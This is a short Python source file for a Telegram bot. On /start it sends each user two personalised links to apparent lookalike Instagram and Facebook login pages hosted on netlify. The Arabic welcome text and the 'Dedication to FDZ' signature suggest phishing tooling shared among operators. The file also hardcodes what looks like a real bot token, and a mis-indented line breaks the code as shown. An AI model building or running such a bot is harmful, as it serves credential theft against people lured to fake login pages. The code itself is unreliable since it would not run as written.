import os
import telebot

TOKEN = "8903980560:AAHGPoCwkt0CQcDCXs8z-ljbacSYus_vhuI"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    custom_link = f"https://instagram-account-ginxl9n.netlify.app/?id={user_id}"
    second_link = f"https://account-faceboo-k-ginxil9n.netlify.app/?id={user_id}"  # استبدل هذا الرابط بالرابط الثاني الذي تريده
    
        bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}\n\nورابطك الثاني:\n{second_link}\n\nDedication to FDZ 🖤")



bot.infinity_polling()
